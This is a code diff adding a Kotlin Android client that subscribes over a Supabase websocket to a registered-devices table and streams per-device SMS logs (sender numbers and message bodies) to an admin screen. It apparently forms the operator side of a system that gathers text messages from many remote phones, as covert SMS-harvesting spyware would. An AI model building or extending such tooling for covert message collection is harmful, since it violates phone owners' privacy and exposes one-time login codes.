@@ -1,0 +1,287 @@
+package com.example.admin.network
+
+import android.os.Handler
+import android.os.Looper
+import android.util.Log
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.Response
+import okhttp3.WebSocket
+import okhttp3.WebSocketListener
+import org.json.JSONArray
+import org.json.JSONObject
+import java.util.concurrent.TimeUnit
+import java.util.concurrent.atomic.AtomicInteger
+
+
+class SmsMessagesRealtimeClient(
+    private val supabaseApi: SupabaseApi = SupabaseApi(),
+    private val targetUniqueId: String? = null,
+    private val onConnected: (() -> Unit)? = null,
+    private val onError: ((String) -> Unit)? = null,
+    private val onSmsMessagesChanged: (List<SupabaseApi.SmsLog>) -> Unit
+) {
+
+    companion object {
+        private const val TAG = "SmsMessagesRealtime"
+    }
+
+    private val topic: String = "realtime:public:${SupabaseApi.REGISTERED_DEVICES_TABLE}"
+
+    private val client = OkHttpClient.Builder()
+        .pingInterval(20, TimeUnit.SECONDS)
+        .connectTimeout(30, TimeUnit.SECONDS)
+        .readTimeout(0, TimeUnit.SECONDS)
+        .build()
+
+    private val mainHandler = Handler(Looper.getMainLooper())
+    private val refCounter = AtomicInteger(1)
+
+    private var webSocket: WebSocket? = null
+    private var heartbeatRunnable: Runnable? = null
+    private var reconnectRunnable: Runnable? = null
+
+    private var shouldReconnect = true
+    private var reconnectAttempt = 0
+    private var isConnected = false
+
+    fun connect() {
+        shouldReconnect = true
+
+        if (isConnected || webSocket != null) {
+            return
+        }
+
+        val url =
+            "wss://${SupabaseApi.PROJECT_REF}.supabase.co/realtime/v1/websocket" +
+                    "?apikey=${SupabaseApi.KEY}" +
+                    "&vsn=1.0.0"
+
+        val request = Request.Builder()
+            .url(url)
+            .addHeader("apikey", SupabaseApi.KEY)
+            .addHeader("Authorization", "Bearer ${SupabaseApi.KEY}")
+            .build()
+
+        webSocket = client.newWebSocket(request, socketListener)
+    }
+
+    fun disconnect() {
+        shouldReconnect = false
+        isConnected = false
+
+        stopHeartbeat()
+
+        reconnectRunnable?.let {
+            mainHandler.removeCallbacks(it)
+        }
+        reconnectRunnable = null
+
+        webSocket?.close(1000, "screen closed")
+        webSocket = null
+    }
+
+    private val socketListener = object : WebSocketListener() {
+
+        override fun onOpen(webSocket: WebSocket, response: Response) {
+            isConnected = true
+            reconnectAttempt = 0
+
+            joinChannel(webSocket)
+            startHeartbeat()
+
+            mainHandler.post {
+                onConnected?.invoke()
+            }
+        }
+
+        override fun onMessage(webSocket: WebSocket, text: String) {
+            handleMessage(text)
+        }
+
+        override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
+            isConnected = false
+            this@SmsMessagesRealtimeClient.webSocket = null
+            stopHeartbeat()
+
+            mainHandler.post {
+                onError?.invoke(t.message ?: "WebSocket failure")
+            }
+
+            scheduleReconnect()
+        }
+
+        override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
+            isConnected = false
+            this@SmsMessagesRealtimeClient.webSocket = null
+            stopHeartbeat()
+
+            if (shouldReconnect) {
+                scheduleReconnect()
+            }
+        }
+    }
+
+    private fun joinChannel(socket: WebSocket) {
+        val postgresChanges = JSONArray().apply {
+            put(
+                JSONObject().apply {
+                    put("event", "INSERT")
+                    put("schema", "public")
+                    put("table", SupabaseApi.REGISTERED_DEVICES_TABLE)
+                    put("filter", "app_id=eq.${SupabaseApi.APP_ID}")
+                }
+            )
+            put(
+                JSONObject().apply {
+                    put("event", "UPDATE")
+                    put("schema", "public")
+                    put("table", SupabaseApi.REGISTERED_DEVICES_TABLE)
+                    put("filter", "app_id=eq.${SupabaseApi.APP_ID}")
+                }
+            )
+        }
+
+        val payload = JSONObject().apply {
+            put(
+                "config",
+                JSONObject().apply {
+                    put("broadcast", JSONObject().apply { put("self", false) })
+                    put("presence", JSONObject().apply { put("key", "") })
+                    put("postgres_changes", postgresChanges)
+                }
+            )
+            put("access_token", SupabaseApi.KEY)
+        }
+
+        val joinMessage = JSONObject().apply {
+            put("topic", topic)
+            put("event", "phx_join")
+            put("payload", payload)
+            put("ref", nextRef())
+        }
+
+        socket.send(joinMessage.toString())
+    }
+
+    private fun handleMessage(text: String) {
+        try {
+            val json = JSONObject(text)
+            val event = json.optString("event", "")
+
+            if (event == "postgres_changes") {
+                handlePostgresChanges(json)
+            }
+
+        } catch (e: Exception) {
+            Log.e(TAG, "handleMessage error", e)
+        }
+    }
+
+    private fun handlePostgresChanges(json: JSONObject) {
+        try {
+            val payload = json.optJSONObject("payload") ?: return
+            val data = payload.optJSONObject("data")
+
+            val record =
+                payload.optJSONObject("record")
+                    ?: payload.optJSONObject("new")
+                    ?: data?.optJSONObject("record")
+                    ?: data?.optJSONObject("new")
+                    ?: return
+
+            val appId = record.optString("app_id", "")
+            if (appId.isNotBlank() && appId != SupabaseApi.APP_ID) return
+
+            val deviceId = record.optString("sub_id", record.optString("uid", "")).trim()
+            if (deviceId.isBlank()) return
+
+            val target = targetUniqueId?.trim().orEmpty()
+            if (target.isNotBlank() && deviceId != target) return
+
+            val parsedSms = mutableListOf<SupabaseApi.SmsLog>()
+
+            parsedSms.addAll(supabaseApi.parseSmsMessagesFromRegisteredDevice(record))
+
+            val lastSmsLog = record.optJSONObject("last_sms_log")
+            if (lastSmsLog != null) {
+                supabaseApi.parseSingleSmsObject(deviceId, lastSmsLog, 0)?.let { sms ->
+                    parsedSms.add(sms)
+                }
+            }
+
+            if (parsedSms.isEmpty()) return
+
+            val unique = parsedSms
+                .distinctBy { sms -> "${sms.uniqueId}-${sms.id ?: "${sms.timestamp}|${sms.senderNumber}|${sms.body.hashCode()}"}" }
+                .sortedByDescending { it.timestamp }
+
+            mainHandler.post {
+                onSmsMessagesChanged.invoke(unique)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "handlePostgresChanges error", e)
+        }
+    }
+
+    private fun startHeartbeat() {
+        stopHeartbeat()
+
+        heartbeatRunnable = object : Runnable {
+            override fun run() {
+                val socket = webSocket
+                if (socket == null || !isConnected) return
+
+                val heartbeat = JSONObject().apply {
+                    put("topic", "phoenix")
+                    put("event", "heartbeat")
+                    put("payload", JSONObject())
+                    put("ref", nextRef())
+                }
+
+                socket.send(heartbeat.toString())
+                mainHandler.postDelayed(this, 25_000L)
+            }
+        }
+
+        mainHandler.postDelayed(heartbeatRunnable!!, 25_000L)
+    }
+
+    private fun stopHeartbeat() {
+        heartbeatRunnable?.let {
+            mainHandler.removeCallbacks(it)
+        }
+        heartbeatRunnable = null
+    }
+
+    private fun scheduleReconnect() {
+        if (!shouldReconnect) return
+
+        stopHeartbeat()
+
+        reconnectRunnable?.let {
+            mainHandler.removeCallbacks(it)
+        }
+
+        reconnectAttempt++
+
+        val delayMs = when {
+            reconnectAttempt <= 1 -> 1_000L
+            reconnectAttempt == 2 -> 3_000L
+            reconnectAttempt == 3 -> 5_000L
+            else -> 10_000L
+        }
+
+        reconnectRunnable = Runnable {
+            if (shouldReconnect && webSocket == null) {
+                connect()
+            }
+        }
+
+        mainHandler.postDelayed(reconnectRunnable!!, delayMs)
+    }
+
+    private fun nextRef(): String {
+        return refCounter.getAndIncrement().toString()
+    }
+}
